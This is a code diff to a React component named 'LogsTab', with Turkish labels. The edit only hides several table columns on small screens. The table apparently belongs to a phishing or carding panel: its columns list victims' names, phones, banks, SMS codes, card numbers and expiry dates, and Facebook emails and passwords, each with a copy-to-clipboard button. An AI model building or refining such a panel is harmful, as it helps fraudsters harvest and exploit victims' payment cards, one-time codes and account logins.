@@ -2243,13 +2243,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="w-[6%] px-2 py-3 font-semibold text-center">İzle</th>
                 <th className="w-[5%] px-2 py-3 font-semibold">Ödül</th>
                 <th className="w-[7%] px-2 py-3 font-semibold">İsim</th>
-                <th className="w-[6%] px-2 py-3 font-semibold">Numara</th>
+                <th className="w-[6%] px-2 py-3 font-semibold hidden md:table-cell">Numara</th>
                 <th className="w-[13%] px-2 py-3 font-semibold">Banka</th>
-                <th className="w-[7%] px-2 py-3 font-semibold">Onay</th>
-                <th className="w-[9%] px-2 py-3 font-semibold">Generator</th>
-                <th className="w-[5%] px-2 py-3 font-semibold">SMS</th>
-                <th className="w-[6%] px-2 py-3 font-semibold">Kart</th>
-                <th className="w-[8%] px-2 py-3 font-semibold">FACEBOOK</th>
+                <th className="w-[7%] px-2 py-3 font-semibold hidden md:table-cell">Onay</th>
+                <th className="w-[9%] px-2 py-3 font-semibold hidden md:table-cell">Generator</th>
+                <th className="w-[5%] px-2 py-3 font-semibold hidden md:table-cell">SMS</th>
+                <th className="w-[6%] px-2 py-3 font-semibold hidden md:table-cell">Kart</th>
+                <th className="w-[8%] px-2 py-3 font-semibold hidden md:table-cell">FACEBOOK</th>
                 <th className="w-[7%] px-2 py-3 font-semibold">Sayfa</th>
                 <th className="w-[6%] px-2 py-3 font-semibold">Durum</th>
                 <th className="w-[15%] px-2 py-3 font-semibold text-right">İşlemler</th>
@@ -2427,7 +2427,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
@@ -2478,7 +2478,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         )}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       {approvalEntries.length === 0 ? (
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       ) : (
@@ -2494,7 +2494,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         </div>
                       )}
                     </td>
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       {genEntries.length > 0 ? (
                         <div className="space-y-2">
                           {genEntries.map((entry, gi) => (
@@ -2520,7 +2520,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       )}
                     </td>
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       <div
                         className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                         onClick={() => copyToClipboard(smsValue)}
@@ -2528,7 +2528,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {smsValue || '-'}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       <div className="space-y-1 text-[10px] font-medium leading-tight">
                         {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                         {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
@@ -2537,7 +2537,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     {/* === FACEBOOK SUTUNU (YENI, Sadece fbEmail/fbPassword/fb AdSoyad goster) === */}
-                    <td className="px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top hidden md:table-cell">
                       <div className="space-y-1 text-[10px] font-medium leading-tight">
                         {fd.fbEmail && (
                           <div className="flex min-w-0 items-start gap-1">
